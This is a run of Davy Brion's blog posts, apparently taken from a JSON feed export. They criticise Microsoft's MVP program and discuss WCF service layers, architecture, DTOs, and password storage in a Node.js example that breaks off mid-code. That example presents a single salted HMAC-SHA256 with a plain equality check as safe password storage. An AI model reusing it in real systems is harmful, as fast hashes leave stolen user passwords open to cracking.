on anything if they don't really spend any other time on software development outside of work? That just doesn't make a lot of sense to me. If I look back on my own career so far, I've typically been rather passive outside of working hours in periods where I felt like I was working on cool things, where I was challenged, where I was learning a lot on the job. Conversely, I've always been much more involved with software development outside of work when I was working on things during working hours that I didn't find challenging or interesting or where I wasn't learning anything new. I'm guessing that this holds true for a lot of people, though certainly not all.</p><p>Of course, if you're not working on interesting things or continuously learning and improving on the job, it's your own responsibility to make sure that your skills and insights stay up to date. You don't <em>have</em> to put in the effort to do that, but if you don't, you don't really have a reason to complain either when you're not happy with the kind of work that you're doing.

Give Me A Break.","published":{"$wrap":"$date","v":1334513509000,"h":"2012-04-15T18:11:49.000Z"},"starred":false,"read":false,"content":"<p>I've always been very skeptical of Microsoft's MVP award. Officially, Microsoft's MVP award stands for Most Valuable Professional, but its true meaning is probably closer to Most Valuable Promoter. The quality and integrity of the MVP's you know is probably dependent on the region in which you work. I work in Belgium, and over here the MVP program is, in my opinion, a joke. I'm going to discuss why I think it's a joke but keep in mind that this will depend on your region. I know that there are indeed great MVP's out there who do have professional integrity and true real world experience in some regions, but I certainly wouldn't be surprised if the state of the MVP program in Belgium occurs in other regions as well.</p><p>First of all, let's take a look at an image that Microsoft uses on its <ahref=\"http://mvp.support.microsoft.com/\">MVP page</a>:</p><p><imgsrc=\"http://davybrion.com/mvp.png\" alt=\"MVP image\" /></p><p>\"Independent Experts. Real world Answers.\"</p><p>This is indeed what the MVP program <em>should</em> be about. It is however the exact opposite of what I and many others in Belgium have experienced. Let's cover the words in those 2 sentences a bit more in-depth.</p><h3>Independent</h3><p>Most of the .NET MVP's in Belgium work for a handful of companies that happen to be big sponsors of every important Microsoft event in Belgium. Now, could it be possible that the best .NET developers in Belgium all work for these handful of companies? I highly doubt it. I know a lot of great developers in Belgium and none of them work for these companies. And I'm quite sure that none of those people are less valuable or knowledgeable than any of those MVP's. In my experience, there is hardly anything independent about the Belgian .NET MVP's. Most of them got their first MVP award while they were employed by sponsors or 'strategic partners' of Microsoft. Most of them tout the latest and greatest Microsoft technologies, pretty much unquestioned, even if it means contradicting their statements and positions when they were promoting the technology that Microsoft wanted them to promote 3 or 4 years ago. And they're never openly critical of anything Microsoft-related out of fear that it will negatively impact their chances of being renewed as an MVP. They may not work for Microsoft, but they are anything but independent of Microsoft.</p><h3>Experts</h3><p>This is a tough one. What makes one an expert? In some fields, people are considered to be experts based on the amount of research they've done. In other fields, people are considered to be experts based on what they've actually done. I don't think I'm going out on a limb here by saying that in the field of software development, what you've done <em>should</em> be more important than what you've researched or read about. In my opinion, an expert in a specific technology should have built at least one, and ideally more than one, non-trivial system using the technology in question and should be able to tell you about mistakes they've made, things you should avoid, and should never use examples that promote bad practices. I rarely hear MVP's talk about things you should avoid. I rarely hear MVP's talk about mistakes they've learned from. I routinely see examples from MVP's that make me cringe. I routinely hear MVP's promote technologies even though they haven't actually built anything impressive with it. I think of a lot of words when I see examples or proposed solutions by MVP's, but the word 'expert' unfortunately isn't one of them. This also applies to the Microsoft Extended Experts Team by the way. I can only question the validity of such a team if it contains people who are listed as experts of a particular technology when I happen to know for a fact that some of those people have never even used the technology they're supposed to be an expert in in a real world project. Let's be honest here: most of the MVP's and the MEET members simply aren't experts. They are people who have a strong interest in a particular (or more) technology and do their best to promote said technology. There's nothing wrong with that at all, but there's a huge difference between that and being an expert in something.</p><h3>Real world answers</h3><p>This one cracks me up the most because most of the Belgian MVP's hardly work on real world projects. And when they do, they typically work on \"multiple projects\" as they like to say it. For anyone who's ever worked on multiple projects at the same time: could you honestly say that your contributions were truly valuable to the end result? Let me put it differently: don't we all know that people generally produce the best results when they don't have to juggle too many things at once and can focus on as few things as possible? You will rarely hear about a Belgian MVP working full time on a non-trivial real-world project. A lot of them get to spend a certain number of paid hours each week on 'community work', which means blogging, writing articles for magazines, creating presentations for events, etc. When they're not working on that, you'll often find them talking on Twitter about pretty much anything but interesting or demanding work. And of course, their employers will occasionally send them to clients for a bit of consulting here or there, or to do a product demo. Unless these guys are putting in 60 to 80 hours a week (which I seriously doubt), I'm having trouble figuring out when exactly they do the kind of interesting work on real world projects that would enable them to provide answers based on real world experience.</p><p>It also doesn't help that I've frequently heard rather unflattering stories about these MVP's from people who've worked with them. It's pretty much always the same: they're not invested into the project, they spend too much time 'interacting with the community' and if you let them go near important parts of the code base, bad things usually happen. Now, I'm not the type of person who simply believes everything he hears. In fact, when it comes to matters like these, I generally only believe the stories I hear from people of whom I'm truly sure that they know what they're talking about. And if you've been reading this blog for a while, you'll know I'm rather critical and that I set the bar rather high when it comes to that.</p><p>Lastly, my personal working experience with MVP's has been abysmal as well. I once worked for a client where we had to get rid of 2 people because of how bad they performed in real world circumstances. One of them was an MVP at the time, and now works at Microsoft as an Evangelist. The other wasn't an MVP at the time, but has been one for a few years now and is even one of the Regional Directors of this region. A few years later, I had drinks with a manager of the company they both worked for and he bluntly admitted that both of them are useless on real projects but that their MVP status was a huge benefit to the company from a marketing and image perspective. Not exactly the image or branding I'd be looking to put out there, but hey, to each his own.</p><h3>Why On Earth Did I Write This?</h3><p>For 2 reasons. I think this whole MVP thing sets a bad example to young and impressionable developers who aren't sure what to focus on to advance their careers. To outsiders, these MVP's sure look like they've got a great thing going and it's easy to see how that could impress people who don't know better. There are already quite a few developers who suck up to these MVP's in the hopes of someday getting to 'that level' as well. I'd much rather see these people put effort into learning about concepts that will last them a long time and building skills that are transferable to multiple technologies instead of sucking up to the wrong people, and trying to network their way to more interesting work because the work that results from that is truly mediocre at best. By all means, try to make a name for yourself by blogging and speaking publicly. But do yourself a favor and stay true to yourself and favor quality over quantity when considering the audience you want to target. Hey, it worked for me <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>The second reason is because this whole MVP thing is, in my opinion at least, offensive to the many dedicated professionals who give their all at their jobs as they work on real projects that matter, as they try to mentor younger developers in their workplace, as they try to optimize the way they develop software not only for themselves, but for their teammates and their employers or clients. These are your true <em>valuable professionals</em>.</p><p>I'm sure I'm gonna get a lot of flak for this post, but honestly, it won't really make any difference to me. The people who'll be offended are people I'd rather not work with anyway. And of course, I feel quite confident that I'll rarely, if ever, have to deal with these people in a professional setting since I'm primarily interested in interesting and demanding work <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/v0N7GPTJ8-o\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1202}}

Even though the source code of ASP.NET MVC has always been available under an open source license, its development followed a closed development model. This meant that outside contributions weren't possible, nor were we able to follow the actual commits in the MVC source code repository. With the recent announcements, this is no longer the case and I think this is fantastic news. It finally enables collaboration between Microsoft employees and people outside of Microsoft on a strategically important Microsoft product. This is good for Microsoft as well as the open source .NET community.</p><p>I hope that this newfound appreciation for Open Source within Microsoft will lead to another huge improvement in collaborative development in the open source .NET community. While Microsoft is now open to accepting contributions from the community, it would be a tremendous step forward if Microsoft would also contribute to other prominent open source .NET projects in the future. In the past, we've seen numerous open source .NET projects become popular and widely used. And unfortunately, Microsoft responded to some of those projects by producing their own libraries and frameworks that basically do the same thing. Except that, for most of those projects, they never quite matched the quality of the open source projects they were inspired by. If only all of that effort spent on duplicating already existing libraries would've been spent on <em>improving what was already there</em>, the entire .NET community would've been better for it.</p><p>I'd love to see a Microsoft that works <em>with</em> open source developers and encourages them, instead of trying to duplicate their efforts whenever they feel they need to provide their own library or framework for something that's already covered by a superior open source alternative. These duplicated projects only alienate people that at one point were passionate enough about the .NET platform to work on improving it for free, in their spare time. These are the people that Microsoft needs to cherish and nourish instead of competing with them. Microsoft has shown some interesting signs of better understanding of open source development and collaboration in the past year or so.

I used to be a fan of this approach as well, but these days I just don't see the benefit of that internal service layer anymore. The overhead that an internal WCF service layer adds to development, deployment and runtime performance just doesn't stack up favorably to the supposed benefits IMO. To be clear: I'm talking about WCF services that will <em>only</em> be used by the front end of your web application.</p><p>Let's talk about the overhead on development first. If you're using WCF services in your web app, you need proxies to access those services. Some people prefer to generate the proxies based on the WSDL of the services that will be used. In the worst case, this leads to regenerating proxies and all of the types that are defined in the WSDL every time you change a service contract or one of the types that are used by the services. If multiple people need to make changes to any of these concurrently, this easily leads to merging problems when people need to commit their changes. Another way is to share the same types on both sides (client & server), and implement your service proxies by inheriting from ClientBase and manually keeping the implementation of the proxies up to date with the definitions of their service contracts. This is better than regenerating a bunch of code all the time, but you're still writing a lot of redirection code for the purpose of, well, what exactly? Another possibility is to use dynamic proxies which automatically implement the service contracts but this increases the amount of infrastructure code you need to put in place and it's not always clear to everyone how exactly communication with the services happens. There's also a lot of WCF configuration for each service that you need to maintain, and it can quickly grow unwieldy.</p><p>Then there's the overhead on performance. I hope we can all agree that any operation that goes out of process is at least an order of magnitude slower than a similar operation that can be executed in process. First of all, there's the networking overhead (even if your services are hosted on the same machine as the web app) that you have to keep into account. Secondly, there is the cost of serializing and deserializing <em>everything</em> that is transferred between the client and the server. Even with the most efficient bindings and serializers, the cost of all of this quickly adds up on high-traffic web apps. That's not to say that WCF services are inherently slow. They can be very fast and efficient, but they'll never be as fast and efficient as executing that logic in process within the web app.</p><p>Finally, there's the extra overhead it introduces to the deployment phase:</p><ul><li>more endpoints to set up and transfer artifacts to</li><li>more configuration</li><li>more monitoring of endpoints</li><li>more servers if you're not hosting the services and the web app on the same machine</li></ul><p>Of course, people will argue that there a plenty of benefits to using a WCF service layer in a web app. The ones I hear about most often are the forced separation of business logic and UI logic and improved scalability and reliability. I really disagree that you need a physical separation of business and UI logic. I much prefer approaches where the separation is based on abstractions. A good example was recently posted by Ayende (<ahref=\"http://ayende.com/blog/154241/limit-your-abstractions-the-key-is-in-the-infrastructurehellip\">here</a> and <ahref=\"http://ayende.com/blog/154273/limit-your-abstractions-and-how-do-you-handle-testing\">here</a>). And when it comes to scalability/reliability, a web app that isn't dependent on a WCF service layer is as easy (or even easier depending on your setup) to scale than one that is entirely dependent on WCF services. First of all, if you care about scalability/reliability your web app should already be prepared to run behind a load balancer. If you already have a load balancer in place, you can just add more web servers to your setup when needed. If you'd host the WCF services on the same machines that are hosting the web front end, you'd get less total throughput from one server than you would if that one server could just host a web app that fully executes in process (not including the database obviously). If you're hosting the WCF services on separate machines, you'd end up with more servers to handle the load and to achieve the reliability you need than you would with just being able to add more web servers to your setup. That also increases your licensing costs. And of course, it also means increased networking overhead on every service call, which also implies that the threads on your web servers will be blocked for longer periods while they wait for those service calls to return. Unless you're calling those services asynchronously, but most people simply don't. Also, if you have serious scalability and reliability requirements you're probably better off with asynchronous messaging solutions than with SOAP services.</p><p>WCF has its benefits (though I prefer Web API's or asynchronous messaging over SOAP services these days) and it has its use cases. I just don't think internal service layers for web apps is one of them.</p><p>What are the benefits that you think an internal WCF service layer brings to your web app? And what's your opinion on how they stack up versus the downsides?</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=p7TClTj7aaA:Euy9rEjAZC4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=p7TClTj7aaA:Euy9rEjAZC4:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/p7TClTj7aaA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1204}}

There's one part in the post that I don't entirely agree with:</p><blockquote><p>I like to believe learning should be a hands-on activity as well. Basically, stop consuming, start producing. Don't get me wrong, I do think there is value in reading blog posts (I might be slightly biased on this one), reading books and watching videos, but I find that this value is marginal compared to what you gain by actually doing it.</p></blockquote><p>Hands-on activity (producing) is certainly a very important part of any learning process, but I wouldn't go as far saying that the value of reading books/blogs (consuming) is marginal compared to that of producing. In fact, I believe their value to be pretty equal. I've seen too many people who start producing simple things, and then think they've got a pretty good grasp of the technology they're using and then move on to producing more complex or bigger things without actually knowing enough of the technology they're using to support the more complex or bigger scenarios. The results certainly aren't always pretty and I'm sure each and every one of you has seen this scenario unfold with at least one developer you know. Probably more than that even.</p><p>I think in a lot of cases, people start the producing phase perhaps a bit too early and then in their enthusiasm of seeing things working sort of skip the more boring consuming that could've benefitted them a lot. Once you've started producing, you <em>need</em> to keep consuming regularly. A tremendously valuable part of any learning experience is getting feedback and insight from minds that have more experience with a given subject than yours. If you're lucky, you can get this from your coworkers. If you're not that lucky, you'll need to find other sources and books, blogs, videos, user group meetings, etc can be a great way to fill that void. And even if you do get to learn a lot from your coworkers, it <em>never</em> hurts to learn more from the experiences of others outside of your immediate circle, if only because their situations and constraints will differ from yours as well.</p><p>The other very important part about consuming is really getting to know the technology you're trying to learn. I've always found it very important to at least get an idea of how things work internally within a technology that I'm using. You certainly don't need to know all of the implementation details but just having an idea of it can really help you avoid a lot of problems once you need to use a technology in a more advanced way than in your initial experiments. Most importantly, it should give you better insights as to whether you're using the technology <em>properly</em>, which unfortunately isn't always the same as getting something working. And as a bonus, you'll probably learn about features you won't immediately need but knowing that they're there can save quite a bit of time and effort later on. Just imagine the improvement of the signal-to-noise ratios that you'd see on mailinglists, forums, and StackOverflow if everyone took the time to get a better grasp of the technologies they're using.</p><p>When I start with learning new libraries or frameworks, I usually start off by reading most (and often, all) of the official documentation of the technology before I even get into building something myself. If I want to learn a new programming language I'll look for the most recommended books for that language and buy one (or more, if I wasn't satisfied with the first one). I won't even start using the language until I've gone through the book. Once I feel like I've got a pretty good theoretical grasp of the technology, I start building something with it. I also start looking for good blogs on the technology and subscribe to them. I'll also start following influential people of the technology on Twitter. And I just continuously try to soak up as much knowledge as I can from people who're doing more impressive things with the technology than I am.

None of this is a substitute for learning from producing, but it certainly is an incredible addition to it.

My personal preference is to try not to make things more complex than they should be, while striving to maintain enough flexibility to be able to deal with future changes in both functional and non-functional requirements in a way that hopefully doesn't require extensive effort. I've always thought of good architecture essentially being something that enables developers to keep implementing new features over time at a similar cost than what it took to implement features in the early stages of development. Thus I prefer to try to find a balance between simplicity of the codebase, and making sure that the architecture scales nicely (from a code quality point of view) as the application grows in functionality. I also like to make sure that we can scale out (from a performance/throughput point of view) relatively easily if that need to scale comes up. These are just my general preferences though, and aren't always relevant to every project or suitable for every situation. I'm now in the 10th year of my career and have seen a variety of architectural styles in the wild, and of course I've read and heard about many more since the subject has always interested me a lot. I've learned that it's important to keep <em>architectural drivers</em> of a project in mind when thinking about what kind of architecture is suitable for a certain project or situation. Those drivers are often more important than whatever your personal preferences are. I've come up with a list of drivers that I think should influence the architecture used by teams or organizations.</p><h3>Simplicity/Complexity of the application</h3><p>A common mistake is to decide to use a fashionable architectural style in a project that doesn't really have enough complexity to warrant the use of said architectural style. For instance, there's no reason whatsoever to go the DDD route if your application is mostly a forms-over-data CRUD app. You won't really get any benefit from it, and you'll only increase the total cost of the required development effort. On the other hand, an application which will feature a lot of <em>behavior</em> in a complex domain will certainly benefit from using a DDD approach versus a data-driven approach that implements the behavior in a more procedural, transaction-script based approach. Be honest to your customer/employer and <em>yourself</em> and make an objective decision based on the simplicity or the complexity of the required solution that you're being paid to build. Don't let enthusiasm for a fashionable architectural style influence your decision.</p><h3>Expected lifetime of the application</h3><p>Some applications live for years and years, and some are only temporary solutions that will be phased out a year or two after having been put in production. Of course, some of those temporary solutions end up being used much longer than what was originally expected due to a variety of reasons but that certainly isn't always a given. Unless you're familiar enough with how things typically go at your client or your company to predict these things, your best bet is to just go with the initially expected lifetime of the application. Does a temporary solution require the best possible architecture out there, and the resulting impact that would have on the cost to build it? I'd say it most often doesn't. In these cases, there's nothing wrong with going for the approach that is simply good enough for what is required. Striving for perfection is expensive, and generally not worth it for short-term solutions. Conversely, if the solution is expected to last a long time, a solid architecture becomes more important and is worth the extra investment to (try to) get it right if that makes it possible to keep the costs of long-term development under control.</p><h3>Strategic importance of the application</h3><p>Some applications are meant to improve the <em>core business</em> of a company, while others play a more supportive role in something that isn't actually part of the company's core business. Some applications generate revenue (directly or by improving efficiency of revenue-generating activities) while others are meant to reduce costs, typically administrative in nature. Cost reduction is important, but it's not quite as important as revenue generation and that's a factor that should be taken under consideration. A strategically important application almost always warrants putting in the effort to come up with a good architecture because it's highly likely that the application will have to evolve in whichever direction the business evolves. That's not to say that the same kind of effort wouldn't be important for cost-reducing applications. But it just might be less important than you'd like to think it is. Again, good architecture increases the cost of the project, and the return on that investment in the big picture of the company should not be ignored.</p><h3>Skill-level/discipline of team</h3><p>Good code and good architecture requires skill and discipline. A strong team is capable of letting good architecture grow organically and keep it at a high quality level. For a mediocre team, letting it grow organically is too often a recipe for disaster. Ideally, we'd always be working with strong teams but as we all know, that simply isn't always possible. For mediocre teams, it often makes sense to put architecture in place that is more restrictive in nature and where everyone knows how the code should be structured in advance. The downside is that this typically reduces flexibility and individual creativity, and often introduces more ceremony and indirection than what many of us would ideally like to see. But it's likely that those downsides are offset by having everyone on the same page and taking some possibly difficult decisions away from people who might not be strong enough to make the right decisions. I know that sounds harsh, but that's a reality that many of us have to deal with.</p><h3>Conformity/Continuity</h3><p>A lot of IT departments or software development companies prefer to use the same architecture and frameworks/libraries for most (or even all) of their projects because it makes it easier to have people work on multiple projects. In this situation, it's easier to move people between projects or have them do maintenance work on a project they weren't initially involved in. While this often prevents going with the most suitable approach for every project, it does introduce a few benefits that are hard to argue with. People will need less time to get familiar with a code base. In-house training and sharing of knowledge get easier. Bringing in new people (especially for temporary assignments) also gets somewhat easier because you have a baseline of required skills/knowledge that should go a long way within the organization. A huge downside however, is that it creates an environment that will quickly frustrate creative developers. Also, when new strong developers are brought in, they could quickly tune out once they realize they got there too 'late' to have any influence on how projects are developed. The interesting part about this driver is that it is influenced by the skill-level-discipline driver, while simultaneously influencing it towards the future.</p><h3>Non-functional requirements</h3><p>This is the last driver on the list, but it is certainly not the least important. Obviously, architecture is greatly influenced by some important non-functional requirements. There are many factors that can have a profound influence on what the most suitable architecture of a system could be, and it's important to think about those as quickly as possible. Do you need to respond in real time? Do you need to support mobile devices? Will there be connectivity issues? Will you need to scale massively? What are the auditing requirements? Are you dependent on third-party services? Do you need to minimize resource consumption? What kind of accessibility do you have to keep into account? The list goes on and on and many of these issues can end up becoming huge problems if you don't think about them ahead of time. Of course, you can't think of everything in advance, and many non-functional requirements can be introduced during the lifetime of the application instead of being known in advance. But the more you know in advance, the better you can prepare your software for them from the beginning.</p><h3>Conclusion</h3><p>There is a virtually endless variety of architectural choices and styles that can influence how you develop software. And unfortunately, there's a lot of dogma surrounding it as well. I hope this post made it clear that there is no definitive 'right' or 'wrong' when it comes to architecture, and that (as pretty much everything else in this business) it all really depends <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>I'm sure you can think of more architectural drivers, and I'd love to hear about any that you think I've forgotten.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=yuIOGHkNr8w:Ba16cBbiCmg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=yuIOGHkNr8w:Ba16cBbiCmg:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/yuIOGHkNr8w\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1206}}

I've been a fan of DTO's for a long time, but I'm not a fan of how I frequently see them being used. More specifically, I very much dislike the all-too-common approach of creating a DTO for each entity in your domain model. In the worst cases, the DTO's actually reference each other and try too hard to mimic the structure of the entities. For example, an OrderDto which has a reference to a CustomerDto and a collection of OrderLineDto instances. In those cases, I absolutely agree that all of the mapping involved introduces way too much ceremony to the codebase without really offering any concrete benefits.</p><p>Of course, it really depends on the architecture of your system.  If you're using services that are only used by the front-end of your system, then I'd still advise against making those entities available outside of the service boundary for reasons that I've discussed <ahref=\"http://davybrion.com/blog/2010/05/why-you-shouldnt-expose-your-entities-through-your-services/\">earlier</a>. That doesn't mean that you should go the entity-mimicking-DTO-route though. In fact, entity-mimicking-DTO's introduce a few of the same downsides you'd get from exposing entities directly through  your services. For an 'internal' service (i.e. only used by <em>your</em> application), I think it makes a lot more sense to use DTO's per service operation which are optimized for the use case that that service operation is meant to implement.</p><p>Essentially, an internal service's operations will be either <em>queries</em> or <em>commands</em>. When it comes to queries, why not just do the simplest thing possible? In most cases, it's sufficient to just return the data in the exact same form that the data will be displayed in. Quite often, that means a denormalized set of data where the data comes from more than one type of entity/table. There's no reason to send a bunch of entity-mimicking DTO's that reference each other to the client if you're going to use the data to populate a grid. Just send a list of DTO's which are already in the most optimal form. Populating those DTO's can then simply be done through straight SQL, a view, a stored procedure, a <ahref=\"http://davybrion.com/blog/2010/09/think-twice-before-you-map-entities-to-dtos/\">projection through your ORM</a>, a map/reduce operation, or whatever else that makes sense. The point is that in most cases, you should just <em>populate</em> those DTO's as directly as you can instead of <em>mapping</em> to those DTO's. In this case, the DTO's offer a clear-cut benefit and don't really introduce tedious ceremony code in your codebase.</p><p>As for the commands (inserts, updates, anything that <em>creates</em> something or results in something <em>happening</em>), why even use DTO's in the first place? People will often argue that the ability to reuse the entity-mimicking-DTO's for these operations is a benefit. Personally, I don't really see the benefit. The mere presence of entity-mimicking-DTO's only encourages people to use them for the queries as well. Instead, I prefer to go with types that encapsulate all of the data relevant to the current command (the data to be inserted/updated, or whatever else the command needs). In a very simple scenario, this could be an InsertCustomerCommand type which simply has properties for the data that needs to be inserted. Nobody will be confusing these types with any other purpose than what their name communicates.</p><p>If you're building a web app where the server-side code does everything in process (i.e. without a WCF service), then you can in many cases just use the entities directly without a real drawback, though I'd recommend keeping an eye on unexpected select N+1 problems, since those will frequently come up when you're preparing your views. But even in this case, using DTO's that are optimized for the scenarios in which they're being used can really simplify the query-side of your system a lot.</p><p>There's nothing inherently wrong with DTO's if you use them to simply transfer <em>data</em>. If you're using them to transfer entities, you're robbing yourself of their biggest benefit while only making things more complex than they need to be.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=wDCy16gD6Uc:Dm-fM00yqSc:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=wDCy16gD6Uc:Dm-fM00yqSc:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/wDCy16gD6Uc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1207}}

The many Anonymous hacks in the past year that resulted in the leaking of users' passwords also show that many sites still store passwords in either clear-text or encrypted form. It's actually quite simple to store credentials safely, so here's a quick recap and example.</p><p>The biggest issue with storing passwords is that you have to assume that it's always possible that someone can get access to your database. Yes, even if it's not directly exposed to the outside world, which it <strong>never</strong> should be. Whatever security measures you've put in place to protect your database, it's a good idea to assume that sooner or later, someone will be able to punch a hole through your security measures and be able to read the data. So obviously, you really don't want to store clear-text passwords. You also don't want to store encrypted passwords because encrypted data can always be decrypted. And if people get access to those encrypted passwords even if they weren't supposed to, it'd be wise to assume that they also know how to decrypt them, or that it won't take them long to figure it out.</p><p>A much better approach is to store a hashed representation of the password instead, using a strong one-way cryptographic algorithm and a <strong>unique</strong> salt value per password. If the cryptographic algorithm is one-way, it means you can't apply another algorithm to get the original source value again. The only way to compare passwords is to apply the cryptographic algorithm on a given password using the originally used salt value, and then compare the resulting hash with the one you've stored. If they are identical, the given password is the same as the one that was used originally. If they differ, the password is invalid.</p><p>Attackers can still employ <ahref=\"http://en.wikipedia.org/wiki/Rainbow_table\">rainbow tables</a> to try to find password values that generate the same hashes as the ones in your database. Luckily, generating rainbow tables takes time and plenty of space as well so it makes it much harder for attackers to find the passwords. This is why it's so important to use a unique salt value per password. It effectively means that a rainbow table would have to be generated for every single salt value that you've used, making it practically infeasible to find the original password values.</p><p>Let's demonstrate this with a simple example. The example is from a Node.js application, but this technique can be applied with whatever technology stack you're using.</p><p>This is my User model:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var mongoose = require('mongoose'),crypto = require('crypto'),uuid = require('node-uuid'),Schema = mongoose.Schema,ObjectId = Schema.ObjectId;var userSchema = new Schema({name: { type: String, required: true, unique: true },email: { type: String, required: true },salt: { type: String, required: true, default: uuid.v1 },passwdHash: { type: String, required: true }});var hash = function(passwd, salt) {return crypto.createHmac('sha256', salt).update(passwd).digest('hex');};userSchema.methods.setPassword = function(passwordString) {this.passwdHash = hash(passwordString, this.salt);};userSchema.methods.isValidPassword = function(passwordString) {return this.passwdHash === hash(passwordString, this.salt);};mongoose.model('User', userSchema);module.exports = mongoose.model('User');</pre></div><p>Notice that the salt property of my User type has its default value set to 'uuid.v1'. In this case, uuid.v1 is a function which will be invoked by Mongoose whenever a new User instance is created. Every User instance will thus have a UUID value stored in its salt property. You can also see that I'm not storing the given passwordString in the setPassword function, but that I calculate the hash value based on the passwordString and the UUID salt value.</p><p>Suppose I create a user with the following code:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var user = new User({name: 'test_user',email: 'blah'});user.setPassword('test');user.save(function(err, result) {if (err) throw 